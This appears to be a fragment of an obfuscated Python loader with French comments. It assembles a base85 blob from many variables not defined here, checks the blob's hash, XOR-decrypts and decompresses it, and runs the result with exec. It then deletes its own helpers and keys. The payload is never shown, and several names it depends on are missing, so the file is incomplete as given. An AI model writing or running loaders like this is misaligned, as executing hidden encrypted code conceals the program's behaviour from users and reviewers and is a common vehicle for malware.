_puWFa7mi0yeEeZ = __import__('base64').b85decode(_crsUP9KCTRGhud + _cxkLRFGNkPJVHe + _cnYYGKupQbhdUf + _co14kA6ENvlUav + _czH93bZFRHDRQW + _cyB3juEU9hX6Ye + _csuQSxFcO7BzHz + _cdsXZKdMnsj30y + _clggDAOoi7TADM + _cqglYf92f6wDgo + _cv6dRkc7dnk093 + _cgSGzmWhzM3jh7 + _czDpNBeC0c89L4 + _cxcr4mmG7T2yFr + _chYYpKT9sXG4iM + _cpmnp90C2SyLcU + _cmBi25loWo545V + _cwkTtXATJwwori + _choZAb5R_ONvtI + _clOyE74js6dsJw + _cnx8wdzQYWwad6 + _c_Y3PT2e7YbPpb + _clKjbZ9F2GbPZ8 + _cbzVB025eok1Mp + _cqBOwNNIT3mvQq + _csKkgB5XB_ZDyy + _clAMZo_bSBptmq + _ciifOnhznRV1MO + _crrdFh3bErP3xw + _czYoStuHmP4UCR + _cshWr4_2_KQjM_ + _crmKgvAsoa2RYB + _cqQq7xqIA7DCn7 + _cbH_WMlRTa5mH5 + _coOR6nrYMYyOLC + _cyeoueOrBqZ9b_ + _cytp6t_mDNDfWq + _cfIxjmFZYFht6K + _cv9hHqpSjRp8Gu + _coQXtTrzXaECys + _ceHO229RlAiekc + _cs0KF_gNM2R3Lh + _cpQ9mZPWNiWFGx + _crp6cq87Eo_gtO + _cyppSPTY3OTm6L + _cvXsiJm9qMdeIo + _ckRYeNpN03f0eK + _cbTsGHE6mtBKIr + _cs7ojRfaMObh3v + _cvT7UtrtWsykLZ + _cuxw40U56hkkC8 + _cbUjzPQVK4yqyi + _c_yuGPYJnnrLlm + _coZs1DMeYnLZMW + _cdRCtBjkuyC3cU + _cqnLl_JsWwVJOx + _cpYLRih5T9xeVU + _caKBXpaElh1CvB + _cqtzkgUl4C5WCf + _clqlswIZC0GueQ + _cjVfjYHEIbqazw + _curw94uSH0I0wx + _cxO33QNusI1p35 + _cb2IPauuJcffet + _coYZ8SDpOZMHaK + _cvNph5VmhnJxEK + _cygNqmOKHxZF2R + _cxz5dERd30FDhS + _cshLpCvdoaKSvx + _cucOjS6XnrP6gQ + _cf0gMjKxHCkVMg + _cxd1SqZwYotAf0 + _cmawNEiFrNGXzw + _chyo5FAdGF7W0J + _cnPd7GMK0WUCWG + _ccys2aeBd9IoTK + _cjvT1YSw2QSaIw + _cjbYxNN2ieJmJO + _czzfD8RBvLlpxA + _cqKfAsKXXHBMdo + _chh6h5jUPCOip2 + _ck8UA7BcnmSMSg + _cef6QCFcmi6FXS + _cksKaR1tl1J7Jr + _cejP8FL0R9n4Qw + _cmAXHg4h_rOWCP + _coIrEb0pZHmrMn + _cdPG2d40t1usiv + _cvo9woHV1MxS8p + _cpyM2g6FUWZI7S + _ctbpgkFLRKrWO1 + _cdRSkuueHiRGMI + _cjFA4G5QCCiKJ2 + _cyUvHMJI7zuvMs + _cf5gO5AjJOKcKt + _chUm23OpiVFCKK + _czjMfNXkp5qiXs + _czGqoxKwkWqzlF + _cdc0yN95s6bcFc + _cqry6zdmR736JQ + _cru7k1tjtlL97C + _ciSFcN1gcvcMtM + _ccFp8BVJ3kMvlB + _caRksOZsIWNiFN + _caQQ5T_RV54r1A + _cajdYMsICx7v6I + _ccvQdQK5VlqLhp + _cbhvO99h816SLV + _cpvChvexnmu6GK + _cdzmcu2YUZ9E7n + _cyLu38betvF4i_ + _cn_wFlwy3089CH + _crggCASxYe9UlT + _csud85bptjAE2R + _clo1woddghqZz3 + _cqIIWFqM8XsJrB + _czyukZ2O3LDZ0G + _cchRGtLBkqg71u + _coBWjQJkymwJlw + _ctPdsfauC9r90s + _co9MIlLHlfAD7w + _cjVdJSqud567H5 + _cwJCSzEO2PXiPn + _cqwGGA72VSeKzG + _ccBrlIp5pXymQl + _cbKwjuBE71sggU + _c_KTRgwW1DmCZY + _chPKSWV1MQfxju + _ckDHy4yT3m8KDJ + _caf8cOZiAVCOJA + _cew8lTdy7UPS_F + _co7_7IpMSJGK9P + _cdnxZV4zC9WIrW + _ci5_81mzncFiZC + _ccTnlzDlGBbAOG + _cpyBMB_iU8MyyE + _cc66svyVCSLEWe + _cxamHCKWUC6Z51 + _ccZyD41HOMGG9l + _ckNbJ883o5UAob + _cjh6w2FvVurzEe + _cf8JQHO9VbymiO + _csnLs97PA9ESls + _cqoKHX2Yf8qHzQ + _cvrGU_wupbwi3j + _czVwIAsJnrbIS_ + _cwCezlhaKraDrf + _c_pF_uW5ywMkX5 + _ct6xq220pEsqR2 + _cfDE1AoAhzpk7w + _cnmaUY7uO1beAj + _cwYigrKPMm9Msl + _cdv6IWw2zNvCxS + _cj7eIQjGbKsAOI + _ceq3orc248M7Xk + _cwCTH8BNVBSx8L + _ckHAPq5i9p0tIC + _caQ3bbwX8gvBlu + _cvIBoEzGcQe0tx + _cx5QvtKDMIp3U9 + _cgzsTJmna6vxrN + _coHCuYyW7EjpgP + _cr3aI0ZdA2llRf + _cjT3j210vUrCLJ + _cmfuZIYALtlv5o + _cs2WGCg780ZKYn + _cgH_1Xgs9dhWAd + _cv15jhsoxnOMbU + _cmh4xHYnJpgUAr + _czJPWMX7udgewA + _cvXLV9LMrVHZ_0 + _cyvY_jgvBck7wI + _cqURM8UbN5Y_bb + _cx9imNwvbn1aK4 + _csJJPpNHDNLLpb + _cr_cdOn36ATNce)
if __import__('hashlib').sha256(_puWFa7mi0yeEeZ).hexdigest() != '3bce4bae0f7d9135c9466e466a8649548581047c88ee50247c7f61a9c6458a52':
    __import__('sys').exit(1)
_xzGnDsSycFFtxM = bytes([150, 97, 70, 190, 133, 100, 197, 68, 121, 196, 156, 43, 5, 143, 144, 182, 156, 62, 131, 69])
_fkhRabX5HQrbEE5 = bytes([17, 206, 158, 171, 78, 33, 110, 21, 226, 63, 7, 208, 94, 174, 188, 162, 182, 39, 46, 242])

def _fxzZ2ZMMgccK8bx(_bgtGTMb815NAGF, _klDakrlOchKtp6):
    return bytes(_bgtGTMb815NAGF[_ig2tTQfshcLRMF] ^ _klDakrlOchKtp6[_ig2tTQfshcLRMF % len(_klDakrlOchKtp6)] for _ig2tTQfshcLRMF in range(len(_bgtGTMb815NAGF)))

def _fdk0OcKmPFvrTA8(_to5vaOxBL1CRVN):
    import zlib
    return zlib.decompress(_to5vaOxBL1CRVN) # Un seul niveau de zlib ici pour simplifier

def _fe_4AhFTmyR0OY5():
    import sys, builtins
    # 1. Déchiffrement XOR
    _xqBHQ8rVSqeQEu = _fxzZ2ZMMgccK8bx(_puWFa7mi0yeEeZ, _xzGnDsSycFFtxM)
    # 2. Décompression Zlib
    _dretILH7HxE68P = _fdk0OcKmPFvrTA8(_xqBHQ8rVSqeQEu)
    # 3. Conversion bytes -> string (C'est là la différence clé !)
    source_code = _dretILH7HxE68P.decode('utf-8')
    
    # 4. Préparation de l'environnement
    _main = sys.modules['__main__']
    _nnAkNNeB57jxj4 = _main.__dict__
    _nnAkNNeB57jxj4.setdefault('__builtins__', builtins)
    
    # 5. Exécution directe du code source
    # On compile à la volée, ce qui marche sur n'importe quelle version de Python
    try:
        exec(source_code, _nnAkNNeB57jxj4)
    except Exception as e:
        print(f"Erreur fatale: {e}")
        sys.exit(1)

_fe_4AhFTmyR0OY5()
try:
    del _fxzZ2ZMMgccK8bx, _fdk0OcKmPFvrTA8, _fe_4AhFTmyR0OY5
    del _puWFa7mi0yeEeZ, _xzGnDsSycFFtxM, _fkhRabX5HQrbEE5
except:
    pass
